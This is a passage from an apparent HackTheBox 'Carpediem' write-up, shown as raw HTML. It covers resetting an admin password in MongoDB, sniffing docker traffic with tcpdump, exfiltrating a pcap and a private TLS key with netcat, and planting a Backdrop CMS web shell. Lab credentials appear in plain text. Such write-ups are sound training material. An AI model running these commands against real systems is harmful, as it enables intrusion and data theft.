background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba13c"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"admin"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"fullname"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Robert Frost"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"email"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"rfrost@carpediem.htb"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"role"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"grants"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"admin:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"agent:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"chat:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"tickets:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"accounts:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"groups:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"teams:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"departments:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"comments:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"reports:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"notices:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"settings:*"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"api:*"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hierarchy"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba138"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Admin"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"description"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Default role for admins"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"normalized"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"admin"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"__v"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:0</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAdmin"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"isAgent"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"623c8b20855cc5001a8ba138"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"title"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Sr. Network Engineer"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"lastOnline"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"2022-04-07T20:30:32.198Z"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"groups"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[]}}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">%</span> </span></code></pre></div>
<p>Even though we get <code>"success":true</code> trying to login it still says that the password is incorrect.. But we do have access to the mongodb, maybe it would be easier to just change password in there.</p>
<p>To generate a new bcrypt password I found this <a href="https://unix.stackexchange.com/questions/307994/compute-bcrypt-hash-from-command-line">amazing one-liner</a> where we (ab)use <code>htpasswd</code>:</p>
<div class="sourceCode" id="cb25" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb25-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem htpasswd <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-bnBC</span> 10 <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span> asdf123 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">tr</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">':\n'</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sed</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'s/$2y/$2b/'</span></span>
<span id="cb25-2"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$2</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$1</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$xI</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/.a/s.g6GGgH1xQN5v1unN6zFFMB02O0SrJXCx1MLKVp3Hj3jvO</span></span></code></pre></div>
<div class="sourceCode" id="cb26" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> db.accounts.updateOne<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span></span>
<span id="cb26-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">...</span> { <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"username"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"admin"</span> },</span>
<span id="cb26-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">...</span> { <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$set</span>:</span>
<span id="cb26-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">...</span> { <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"password"</span> : <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$2</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">b</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$1</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">0</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$xI</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">/.a/s.g6GGgH1xQN5v1unN6zFFMB02O0SrJXCx1MLKVp3Hj3jvO"</span> }</span>
<span id="cb26-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">...</span> }</span>
<span id="cb26-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">...</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb26-7"></span>
<span id="cb26-8"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">{</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"acknowledged"</span> : true, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"matchedCount"</span> : 1, <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"modifiedCount"</span> : 1 }</span></code></pre></div>
<p>We’re now able to login to the application <code>http://trudesk.carpediem.htb</code>: <img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem14.png" class="img-fluid"></p>
<p>Looking around we don’t find anything new, information wise. Trying to change user avatar to a malicious one fails, as they move and rename the file on upload. The only interesting information we gain here is the soft phone name <em>“Zoiper”</em>, maybe there’s a vhost for that as well. I can’t find any web interface for Zoiper, so instead we <a href="https://www.zoiper.com/en/voip-softphone/download/current">download</a> it locally and try if we can connect to their server.</p>
<p>We have the name of the new employee, Horace Flaccus (<code>hflaccus</code>), his pin is 2022, his extension is 9650 and dial <code>*62</code> to reach voicemail.</p>
<div class="sourceCode" id="cb27" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  Downloads sudo dpkg <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> Zoiper5_5.5.13_x86_64.deb</span></code></pre></div>
<p>Enter username <code>9650</code> and password <code>2022</code>, when asked to fill in your hostname set it to <code>carpediem.htb</code>. <img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem15.png" class="img-fluid"></p>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem16.png" class="img-fluid"></p>
<p>Calling and listening to Horace’s voice message we learn that the password is <code>AuRj4pxq9qPk</code> ! Testing to login with SSH and we finally get a shell on the box and user.txt.</p>
<div class="sourceCode" id="cb28" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem ssh hflaccus@carpediem.htb</span>
<span id="cb28-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus@carpediem.htb</span> password: AuRj4pxq9qPk</span>
<span id="cb28-3"></span>
<span id="cb28-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus@carpediem:~$</span> id <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">hostname</span></span>
<span id="cb28-5"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb28-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">carpediem</span></span>
<span id="cb28-7"></span>
<span id="cb28-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus@carpediem:~$</span> cat user.txt </span>
<span id="cb28-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">c34afcb6b1659fb635027da20531bc7e</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1---enumeration" class="level3">
<h3 class="anchored" data-anchor-id="step-1---enumeration">Step 1 - Enumeration</h3>
<p>Enumerating manually the information we find is pretty slim so instead fire up <code>linpeas.sh</code> right away.</p>
<p>Going through the output we have two lines shining in red/yellow indicating a 95% PE vector</p>
<div class="sourceCode" id="cb29" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb29-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus@carpediem:/tmp$</span> ./linpeas.sh</span>
<span id="cb29-2"></span>
<span id="cb29-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">════════════════════════════════════╣</span> Processes, Cron, Services, Timers <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sockets</span> ╠════════════════════════════════════</span>
<span id="cb29-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">╔══════════╣</span> Cleaned processes</span>
<span id="cb29-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[i]</span> Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes</span>
<span id="cb29-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">╚</span> Check weird <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">unexpected</span> proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes</span>
<span id="cb29-7">                 <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1578848</span>   sed-Es,jdwp<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tmux</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">screen</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">--inspect</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">--remote-debugging-port,</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,g</span></span>
<span id="cb29-8"></span>
<span id="cb29-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">╔══════════╣</span> Capabilities</span>
<span id="cb29-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">╚</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities</span>
<span id="cb29-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Files</span> with capabilities <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">limited</span> to 50<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb29-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/sbin/tcpdump</span> = cap_net_admin,cap_net_raw+eip</span>
<span id="cb29-13"></span>
<span id="cb29-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">╔══════════╣</span> Can I sniff with tcpdump<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">?</span></span>
<span id="cb29-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">╚</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation#sniffing</span>
<span id="cb29-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">You</span> can sniff with tcpdump!</span>
<span id="cb29-17"></span>
<span id="cb29-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">══╣</span> Possible private SSH keys were found!</span>
<span id="cb29-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/etc/ssl/certs/backdrop.carpediem.htb.key</span></span></code></pre></div>
<p>There’s a section on <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_net_admin-+-cap_net_raw">HackTricks</a> explaining the capabilities combination of <code>cep_net_admin</code> + <code>cap_net_raw</code> - tldr we can dump traffic from network interfaces. I’m not sure what we’re looking for, or what interface to dump, but since there are a lot of dockers and we know that there is a FTP + several http services, we might find something sensitive there.</p>
<p>NOTE: I left this pcap on for about 1 hour while leaving for a meeting, so there’s a lot of traffic in my .pcap.</p>
<div class="sourceCode" id="cb30" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb30-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lp</span> 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> docker0.pcap</span>
<span id="cb30-2"></span>
<span id="cb30-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus@carpediem:/tmp$</span> tcpdump <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> docker0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-s</span> 65535 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> docker0.pcap</span>
<span id="cb30-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcpdump:</span> listening on docker0, link-type EN10MB <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ethernet</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> capture size 65535 bytes</span>
<span id="cb30-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7171</span> packets captured</span>
<span id="cb30-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7171</span> packets received by filter</span>
<span id="cb30-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0</span> packets dropped by kernel</span>
<span id="cb30-8"></span>
<span id="cb30-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus@carpediem:/tmp$</span> nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w3</span> 10.10.14.10 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> docker0.pcap</span></code></pre></div>
<p>Instead of using Wireshark like it’s 1998, I send the .pcap to my Windows Attack VM and open it using <em>NetworkMiner</em> (like it’s 2007) - I think this gives a better quick overview of the dump. From the dump we can quickly see that a certificate has been sent from <code>backdrop.carpediem.htb</code> to the docker host on 172.17.0.1, I have no idea of what to do with this information.</p>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem17.png" class="img-fluid"></p>
<p>Next step took me embarrassingly long time to figure out - from our <em>linpeas</em> output we found a private SSH key. We can use this key to decrypt all SSL traffic, and within we find something interesting.</p>
<div class="sourceCode" id="cb31" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lp</span> 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> backdrop.carpediem.htb.key</span>
<span id="cb31-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus@carpediem:/tmp$</span> nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w3</span> 10.10.14.10 1234 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> /etc/ssl/certs/backdrop.carpediem.htb.key</span></code></pre></div>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem18.png" class="img-fluid"></p>
<p>Now if we follow the TLS Stream we find a login to https://backdrop.carpediem.htb with credentials <code>jpardella:tGPN6AmJDZwYWdhY</code> <img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem19.png" class="img-fluid"></p>
</section>
<section id="step-2---backdrop" class="level3">
<h3 class="anchored" data-anchor-id="step-2---backdrop">Step 2 - Backdrop</h3>
<p>Now to access <code>backdrop</code> we cant simply tunnel with <code>hflaccus</code>:</p>
<div class="sourceCode" id="cb32" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb32-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus@carpediem:~$</span> cat /etc/hosts</span>
<span id="cb32-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">127.0.0.1</span> localhost backdrop.carpediem.htb</span>
<span id="cb32-3"></span>
<span id="cb32-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus@carpediem:~$</span> netstat <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-tulpn</span></span>
<span id="cb32-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Active</span> Internet connections <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">only</span> servers<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb32-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span>
<span id="cb32-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:8000          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb32-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:8001          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb32-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:8002          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>                   </span>
<span id="cb32-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tcp</span>        0      0 127.0.0.1:5038          0.0.0.0:<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>               LISTEN      <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span>  </span></code></pre></div>
<p>Going through all the different ports we find that <strong>8002</strong> is <code>backdrop</code>:</p>
<div class="sourceCode" id="cb33" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb33-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem ssh <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-N</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-L</span> 8002:localhost:8002 hflaccus@carpediem.htb</span>
<span id="cb33-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">hflaccus@carpediem.htb</span> password: AuRj4pxq9qPk</span>
<span id="cb33-3"></span>
<span id="cb33-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> https://localhost:8002</span>
<span id="cb33-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb33-6">    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>Home <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">backdrop.carpediem.htb</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>We’re now able to login to <em>backdrop</em> using credentials <code>jpardella:tGPN6AmJDZwYWdhY</code> <img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem20.png" class="img-fluid"></p>
<p>Googling for <em>“Backdrop cms exploit github”</em> the first hit we get is a <a href="https://github.com/V1n1v131r4/CSRF-to-RCE-on-Backdrop-CMS">CSRF to RCE</a> exploit for version 1.20. Looking in backdrop under <em>Reports</em> &gt; <em>Status Report</em> we see that our instance is running version 1.21.4, lets test it anyway.</p>
<p>Go to <em>Functionality</em> &gt; <em>Install new modules</em> &gt; <em>Manual Installation</em> &gt; <em>Upload</em>, once uploaded make sure to enable the newly added module. It will be located at the bottom of the box <em>Fields</em>:</p>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem21.png" class="img-fluid"></p>
<p>Testing it out and yes, we do have code execution:</p>
<div class="sourceCode" id="cb34" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb34-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> https://localhost:8002/modules/reference/shell.php\?cmd\=id      </span>
<span id="cb34-2"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
